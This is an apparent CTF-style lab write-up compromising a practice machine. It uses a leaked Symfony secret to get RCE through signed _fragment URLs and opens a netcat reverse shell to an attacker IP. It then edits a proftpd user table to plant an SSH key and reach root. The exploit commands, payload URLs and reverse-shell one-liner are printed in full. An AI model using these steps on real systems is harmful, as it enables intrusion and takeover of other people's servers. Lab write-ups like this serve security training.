#box #symfony #php #rce #ReverseShell #phpmyadmin #proftpd #md5 #encrypt #ssh-key-authentication 

Fractal is a machine involving a hard to implement vulnerability in Symfony 3.4.6; Symfony is a set of PHP packages, a WebApplication framework. Once made the vulnerability work and got the foothold, finding the privilege escalation path is hidden in the details of a proftpd configuration file, which unrevels the access to a phpmyadmin containing the ftpusers that can access to ftp. Once discovered the accesses, manipulating the database keys with the proper values consent to access ftp in a machine's user home folder, create the `.ssh` folder and upload an `authorized_keys` that will grant us ssh access throughout the generated private key. Once inside the machine's user, we can gain root by simply `sudo su` since `sudo -l` grants us sudo on all the commands.

## Nmap

Our Nmap scan shows the presence of an FTP Server, SSH and an open 80 port. FTP doesn't allow anonymouus access, thus we opt to check the http port
```bash
# Nmap 7.95 scan initiated Fri Jun  6 15:06:11 2025 as: /usr/lib/nmap/nmap --min-rate=10000 -sCV -o nmap_sCV 192.168.131.233
Nmap scan report for 192.168.131.233
Host is up (0.050s latency).
Not shown: 847 closed tcp ports (reset), 150 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/app_dev.php /app_dev.php/*
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  6 15:06:29 2025 -- 1 IP address (1 host up) scanned in 17.27 seconds
```

## HTTP

The website feels to be a SPA and doesn't return any consistent information, thus we try to perform some enumeration with [FFuF](obsidian://open?vault=Pentesting&file=Commands%20Cheatsheets%2FLinux%2FFFuF) over it with `quickhits.txt` finding an interest path `app_dev.php`. We also discover `phpmyadmin`, but after trying some default combination we didn't succeed at logging in.

![[attachments/fractal-writeup-1.webp]]

### Symfony

By reaching `app_dev.php` we notice that the page seems to be equal to the homepage of the website, but there's a footer highlighting the presence of Symfony, precisely, version 3.4.46.
By looking online, we discover the presence of multiple vulnerabilities but one in particular catches us, documented [here](https://blog.lexfo.fr/symfony-secret-fragment.html).

>This attack was particularly complex to put in place, thus it required a careful reading of the whole article to properly understand the following steps:
>* Where to find the secret
>* The time of command to inject (it mentions that sometimes system could not work)

As mentioned at this [chapter](https://blog.lexfo.fr/symfony-secret-fragment.html#heading-8) of the article, some Symfony debug toolbars allows us to read files from the system, and one of the two mentioned there could contain the secret.
We opt to look inside the `_profiler` of Symfony and we find, in Routing, a list of available paths, precisely an interesting one is `_profiler_open_file`. By running around in the Twig section, we discover that the endpoint used to call the mentioned API is composed as it follows:
```bash
http://192.168.109.233/app_dev.php/_profiler/open?file= # It uses `_profiler/open?` with a `file=` as a parameter
```
We then opt to reach the following endpoint to leak the secret:
```bash
http://192.168.109.233/app_dev.php/_profiler/open?file=app/config/parameters.yml
```
Succeeding, in finding the administrative secret of this application's instance `48a8538e6260789558f0dfe29861c05b`
According to the article, each request made generates a hash based on the secret and the HMAC which is computed against the full URL. Without this hash generation, accessing the URL (even with the secret) will return us a `403` error.
### Signing the RCE URL

To properly sign the URL we require for RCE, we can either use the [Symfony-Exploits](https://github.com/ambionics/symfony-exploits) by Ambionics, or we can manually use the script mentioned in the article to catch the necessary hash for the given request.
#### Ambionics Exploit

```python
# This first URL will return an internal server error, which is correct according to the article but won't succeed because `system` is not working properly

python3 symfony-secret-fragments-v2.py 'http://192.168.109.233/app_dev.php/_fragment' --secret '48a8538e6260789558f0dfe29861c05b' --algo sha256 --method 1 --function system --arguments 'command:id' 'return_value:null' 

http://192.168.109.233/app_dev.php/_fragment?_path=_controller%3Dshell_exec%26cmd%3Did&_hash=vrpj7gS680vH0fEX7DEnx%2FZalQn82OIcMQkcY2V%2BJBY%3D

# If we try, instead, with `shell_exec` we obtain the confirmation that RCE is working
python3 symfony-secret-fragments-v2.py 'http://192.168.109.233/app_dev.php/_fragment' --secret '48a8538e6260789558f0dfe29861c05b' --algo sha256 --method 1 --function shell_exec --arguments 'cmd:id'

http://192.168.109.233/app_dev.php/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=3eXkzaa2AdH5ZbHlXLtzV06YRRSOUJJ3hGa5sddI6ks%3D
```

#### Manually

```bash
page="http://192.168.109.233/app_dev.php/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull" # Do not forget our path has `/app_dev.php/`
secret=48a8538e6260789558f0dfe29861c05b
python3 -c "import base64, hmac, hashlib; print(base64.b64encode(hmac.HMAC(b'$secret', b'$page', hashlib.sha256).digest()))"

# The printed hash, will be the hash to place in the url under the `hash=` parameter in order to make the exact request specified in the page variable work accordingly.
vrpj7gS680vH0fEX7DEnx/ZalQn82OIcMQkcY2V+JBY=
```

>The hash must be URL Encoded in order to make it work. This can be done easily with tools online or with jq.
>```bash
>printf 'vrpj7gS680vH0fEX7DEnx/ZalQn82OIcMQkcY2V+JBY=' | jq -sRr @uri
>vrpj7gS680vH0fEX7DEnx%2FZalQn82OIcMQkcY2V%2BJBY%3D # output
>```

By doing so, we'll receive successfully the confirmation of a RCE in the visited link

![[attachments/fractal-writeup-2.webp]]

At this point, we can set up either a reverse shell or a bind shell to successfully connect to the machine.
Let's try, with `shell_exec` since we confirmed that it works, to perform a reverse shell.

>Since we had some trouble in making the manual script working, probably due to special characters encoding, we opt for the already existing script

### Reverse Shell
We opt to get a reverse shell with a classic shell in netcat `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.167 1337 >/tmp/f`
And we use the previous script to achieve so.

```python
python3 symfony-secret-fragments-v2.py 'http://192.168.109.233/app_dev.php/_fragment' --secret '48a8538e6260789558f0dfe29861c05b' --algo sha256 --method 1 --function shell_exec --arguments 'cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.167 1337 >/tmp/f'

# http://192.168.109.233/app_dev.php/_fragment?_path=_controller%3Dshell_exec%26cmd%3Drm%2B%252Ftmp%252Ff%253Bmkfifo%2B%252Ftmp%252Ff%253Bcat%2B%252Ftmp%252Ff%257C%252Fbin%252Fbash%2B-i%2B2%253E%25261%257Cnc%2B192.168.45.167%2B1337%2B%253E%252Ftmp%252Ff&_hash=kVU%2FoEo9tdJeNPMm0Ilzh%2ByPOsnGZi0uLIsJ7SX%2FPJE%3D
```

Once reached the link , the page hangs, identifying that something is happening but we don't get a shell. Might be the firewall blocking us ? We try with a surely open port, the port 80

```python
python3 symfony-secret-fragments-v2.py 'http://192.168.109.233/app_dev.php/_fragment' --secret '48a8538e6260789558f0dfe29861c05b' --algo sha256 --method 1 --function shell_exec --arguments 'cmd:rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.167 80 >/tmp/f'

# http://192.168.109.233/app_dev.php/_fragment?_path=_controller%3Dshell_exec%26cmd%3Drm%2B%252Ftmp%252Ff%253Bmkfifo%2B%252Ftmp%252Ff%253Bcat%2B%252Ftmp%252Ff%257C%252Fbin%252Fbash%2B-i%2B2%253E%25261%257Cnc%2B192.168.45.167%2B80%2B%253E%252Ftmp%252Ff&_hash=mphI6q6fmTYR5XH%2FCqsIuuXjFHsc7328ZCqG8SDF9%2FQ%3D
```

We configure `nc -lvnp 80` and boom, we're in.

## Privilege Escalation

To achieve privilege escalation, the path is a tricky one. We know for sure an instance of `phpmyadmin` is running on the server. With the credentials found on `app/config/parameters.yml` we couldn't find anything on the database.
We discover other credentials for `phpmyadmin` inside `/etc/phpmyadmin/config-db.php`, but even those doesn't lead us anywhere because the database is empty.
We then remember that a FTP service is running on the account, maybe something related to a FTP connection is available over there?
We head to `/etc/proftpd` and discover a `sql.conf` file.
The file cites what follows:

```text title:'/etc/proftpd/sql.conf'
<IfModule mod_sql.c>
SQLBackend mysql

#Passwords in MySQL are encrypted using CRYPT 
SQLAuthTypes OpenSSL Crypt
SQLAuthenticate users groups 

# used to connect to the database 
# databasename@host database_user user_password 
SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password 

# Here we tell ProFTPd the names of the database columns in the "usertable" 
# we want it to interact with. Match the names with those in the db 
SQLUserInfo ftpuser userid passwd uid gid homedir shell 

# Here we tell ProFTPd the names of the database columns in the "grouptable" 
# we want it to interact with. Again the names match with those in the db
SQLGroupInfo ftpgroup groupname gid members 

# set min UID and GID - otherwise these are 999 each
SQLMinID 33

# Update count every time user logs in
SQLLog PASS updatecount
SQLNamedQuery updatecount UPDATE "count=count+1, accessed=now() WHERE userid='%u'" ftpuser

# Update modified everytime user uploads or deletes a file
SQLLog  STOR,DELE modified
SQLNamedQuery modified UPDATE "modified=now() WHERE userid='%u'" ftpuser

SqlLogFile /var/log/proftpd/sql.log
</IfModule>
```

We identify the presence of a row saying `SQLConnectInfo proftpd@localhost proftpd protfpd_with_MYSQL_password`, so we opt for trying to connect to phpmyadmin throughout those credentials:

```bash
mysql -u proftpd -p # we omit @localhost because it's already embedded at the end of the connection. I suppose it implies it's localhost when is not specified directly.
```

We're in the database, supposedly the FTP database.
We discover the presence of a `proftpd` database with `show databases;` and we opt to `use proftpd;`. We then `show tables;` and discover the presence of two tables:
* ftpgroup
* ftpuser
Precisely, in `ftpuser` a list of available user that, we suppose, can connect to the FTP server is present. We then use `select * from ftpuser;` to query it.
We discover that an userid `www` with a`md5` encrypted password can access the folder `/var/www/html` in ftp. We try to play around by changing its password first.

To make the password change work properly, the password must be encrypted as ProFTPd requires. By looking online, we discover the following documentation: http://www.proftpd.org/docs/howto/SQL.html#SQLOpenSSLSQLAuthType
We then opt to generate a custom password by changing the value of `password` in the double brackets:
```bash
/bin/echo "{md5}"`/bin/echo -n "hacked" | openssl dgst -binary -md5 | openssl enc -base64`
```
We then get the encrypted string and update the MySQL table accordingly:
```mysql
update ftpuser set passwd="{md5}TUCY1k4WPScmlZRV0Eb9fA==" where id=1;
```

We shall now be able to authenticate to the FTP server as `www:hacked`. 

We're in.

Nothing more we can do from here since we only see the files available previously, however, we shall now be able to play around with our ftp user by changing its rights. For instance by putting the rights equal to the user's `benoit` found on `/etc/passwd` to upload our custom ssh key in its `.ssh` folder.

By doing `cat /etc/passwd | grep benoit` we discover that this user has a uid:gid of 1000:1000 `benoit:x:1000:1000::/home/benoit:/bin/sh`. We can then update both the uid:gid specified on the proftpd sql instance and its home folder to land on it, in ftp.

```mysql
update ftpuser set uid=1000, gid=1000, homedir="/home/benoit" where id=1;
```

There are different reasons why we had to update both the rights and the homedir.
The **homedir** was necessary to access the ftp folder on the root folder for that user
The **uid:gid** were necessary because in there we'll have to be able to create a folder and to put a file into it, the public key file.

Once done, we can reauthenticate inside the ftp instance with the same `www:hacked` credentials and we can now create a folder called `.ssh`

Back on our machine, we can now use `ssh-keygen` to generate a pair of keys that can grant us connection to the machine. We'll call these pair `id_rsa` ![[attachments/fractal-writeup-3.webp]]
Now, we **must** duplicate, or simply rename, `id_rsa.pub` into `authorized_keys`. This step is mandatory otherwise the ssh connection will not work if the name of the file is different from `authorized_keys`.
`cp id_rsa.pub authorized_keys`

We can now copy the file through ftp inside the `.ssh` folder in `/home/benoit/.ssh` with the `put` command of ftp.

We shall now be able to connect through SSH with key authentication as the user `benoit` with the custom created pair of keys

```bash
ssh -i id_rsa benoit@192.168.109.233
```

We can now check his capabilities with `sudo -l` and realize that he can execute **any** command as sudo:
![[attachments/fractal-writeup-4.webp]]

We then opt for `sudo su` to successfully gain root of the machine.
